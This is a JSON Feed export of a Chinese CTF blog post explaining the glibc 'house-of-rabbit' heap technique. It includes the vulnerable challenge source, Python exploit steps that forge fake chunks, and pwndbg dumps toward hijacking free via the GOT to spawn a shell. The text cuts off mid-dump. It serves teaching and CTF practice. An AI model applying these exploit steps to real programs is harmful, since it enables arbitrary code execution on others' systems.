{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"house-of-rabbit\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "url": "https://yhuanhuan01.github.io/2024/07/26/house-of-rabbit/",
            "title": "house-of-rabbit",
            "date_published": "2024-07-26T02:03:08.000Z",
            "content_html": "<h1 id=\"house-of-rabbit\"><a class=\"markdownIt-Anchor\" href=\"#house-of-rabbit\">#</a> house-of-rabbit</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写、 <code>use after free</code> 、 <code>edit after free</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— <code>2.31</code></li>\n<li>超过  <code>0x400</code>  大小的堆分配</li>\n<li>可以写  <code>fastbin</code>  的  <code>fd</code>  或者  <code>size</code>  域</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>通过将 chunk 置入 fastbin 内，修改其 fd 指向 fake chunk，然后分配或释放大块，触发 <code>malloc_consolidate</code> ，此时 fake chunk 被放置到 unsortedbin 或对应的 smallbins 或 largebins 内</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">FASTBIN_CONSOLIDATION_THRESHOLD</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token number\">65536UL</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> FASTBIN_CONSOLIDATION_THRESHOLD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">have_fastchunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li><code>2.26</code>  加入了  <code>unlink</code>  对  <code>presize</code>  的检查</li>\n<li><code>2.27</code>  加入了  <code>fastbin</code>  的检查</li>\n</ul>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<blockquote>\n<p>该利用技巧的核心是  <code>malloc_consolidate</code>  函数，当检测到有  <code>fastbin</code>  的时候，会取出每一个  <code>fastbin chunk</code> ，将其放置到  <code>unsortedbin</code>  中，并进行合并。</p>\n</blockquote>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A</code> 、 <code>chunk B</code> ，其中  <code>chunk A</code>  的大小位于  <code>fastbin</code>  范围</li>\n<li>释放  <code>chunk A</code> ，使其进入到  <code>fastbin</code></li>\n<li>利用  <code>use after free</code> ，修改  <code>A-&gt;fd</code>  指向地址  <code>X</code> ，需要伪造好  <code>fake chunk</code> ，使其不执行  <code>unlink</code>  或者绕过  <code>unlink</code></li>\n<li>分配足够大的  <code>chunk</code> ，或者释放  <code>0x10000</code>  以上的  <code>chunk</code> ，只要能触发  <code>malloc_consolidate</code>  即可</li>\n<li>此时  <code>fake chunk</code>  被放到了  <code>unsortedbin</code> ，或者进入到对应的  <code>smallbin/largebin</code></li>\n<li>取出  <code>fake chunk</code>  进行读写即可</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>申请两个 fastbin 大小的 chunk，A，B，C。C 隔断 top_chunk</li>\n<li>freeA，B</li>\n<li>修改 A 的 fastbin chunk 的 <code>大小</code> ，使其包裹 B</li>\n<li>触发 <code>malloc_consolidate</code></li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG91c2Utb2YtcmFiYml0\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/house-of-rabbit</span></p>\n<p><img data-src=\"/img/house-of-rabbit/image-20240726081440063.png\" alt=\"image-20240726081440063\"></p>\n<blockquote>\n<p>题目源码我稍微修改一下，所以直接放源码吧。</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v3 <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Add>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lu\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA00000LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">13337</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>flags <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFFFFFFFFFFFFF70LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            flags <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>v3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"idx>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">&amp;&amp;</span> ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>很明显只能申请 0x10、0x80、0xA00000 和 0xFFFFFFFFFFFFFF70 大小的 chunk 块，最多申请 9 次</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">del</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Del>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存在 uaf 漏洞</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">edt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Edt>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"addr>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>fake<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以往 fake 地址处写，因此可以在 fake 处伪造 fakechunk，并可以修改 fd</p>\n<p>并且程序存在 system</p>\n<ol>\n<li>利用  <code>malloc consolidation</code>  机制去在 buffer 中获得一个 unsortedbin chunk，计算好位置，使得申请巨大内存后，切割下来的 chunk 刚好位于指针数组边上</li>\n<li>通过修改 buffer，使其大小小于 <code>0xA00010</code>  且大于 <code>0x80000</code> ，使该 chunk 通过 sort 过程进入 largebin</li>\n<li>申请巨大内存得到分割后的 chunk 位于指针数组边上，修改指针为 got [‘free’]，向其中写入内存 plt [‘system’]，劫持 free 函数，然后释放一个写有 <code>/bin/sh</code>  的 chunk，拿到 shell</li>\n</ol>\n<p>过程和原因一步一步的讲吧：</p>\n<h5 id=\"1malloc-consolidation\"><a class=\"markdownIt-Anchor\" href=\"#1malloc-consolidation\">#</a> <strong>1.malloc consolidation</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0x10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>触发 <code>malloc consolidation</code>  效果如下：</p>\n<p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000│  0x6012e0 (ptr) ◂— 0x7ffff6dff010<br>\n01:0008│  0x6012e8 (ptr+8) —▸ 0x602420 —▸ 0x601350 (fake+16) ◂— 0x0<br>\n02:0010│  0x6012f0 (ptr+16) —▸ 0x602420 —▸ 0x601350 (fake+16) ◂— 0x0<br>\n03:0018│  0x6012f8 (ptr+24) ◂— 0x0<br>\n… ↓     11 skipped<br>\n0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) ◂— 0x1<br>\n12:0090│  0x601370 ◂— 0x0<br>\n13:0098│  0x601378 ◂— 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Free chunk (fastbins) | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0x20 (with flag bits: 0x21)<br>\nfd: 0x601350</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x602430<br>\nSize: 0xa20bd0 (with flag bits: 0xa20bd1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\n0x20: 0x602410 —▸ 0x601350 (fake+16) ◂— 0x0</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000│  0x6012e0 (ptr) ◂— 0x7ffff6dff010<br>\n01:0008│  0x6012e8 (ptr+8) —▸ 0x602420 —▸ 0x601333 ◂— 0x0<br>\n… ↓     2 skipped<br>\n04:0020│  0x601300 (ptr+32) ◂— 0x0<br>\n… ↓     10 skipped<br>\n0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n12:0090│  0x601370 ◂— 0x0<br>\n13:0098│  0x601378 ◂— 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Allocated chunk | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0xa00010 (with flag bits: 0xa00011)</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x1002420<br>\nSize: 0x20be0 (with flag bits: 0x20be1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x601350</p>\n</blockquote>\n<p>原因：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-rabbit/image-20240726091641543.png\" alt=\"image-20240726091641543\"></p>\n<p>我们可以看见</p>\n<blockquote>\n<p>0x00:pack(0)+pack(0x00),<br>\n0x10:pack(0)+pack(0x11),<br>\n0x20:pack(0)+pack(1)</p>\n</blockquote>\n<p>fake_chunk 设置的是这样。这需要让我们了解一下 <code>malloc consolidation</code>  的过程</p>\n<blockquote>\n<ol>\n<li>从 fastbin 中依次取出 fastbin chunk</li>\n<li>对 chunk 进行简易版的 free 的 consolidation 过程</li>\n<li>向前合并</li>\n<li>向后合并</li>\n<li>插入 unsortedbin</li>\n</ol>\n<p>这里会进行向前向后合并的操作，修改 prev_inuse 标志为 1，可以使其不向上合并，但是依然会进行向下合并的检查：</p>\n<ol>\n<li>用 chunk size + chunk addr 计算出下一个 chunk 所在位置</li>\n<li>用下一个 chunk size + 其 chunk addr 计算出再下一个 chunk 所在位置，然后判断 prev_inuse 位是否是 1，不是 1 就断链合并</li>\n</ol>\n</blockquote>\n<p>所以当触发 <code>malloc consolidation</code>  时</p>\n<blockquote>\n<p>0e:0070│  0x601350 (fake+16) ◂— 0x0 ------------------------------------------------&gt;unsortedbin</p>\n<p>0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0</p>\n</blockquote>\n<h5 id=\"2准备-largebin\"><a class=\"markdownIt-Anchor\" href=\"#2准备-largebin\">#</a> <strong>2. 准备 largebin</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x601350<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 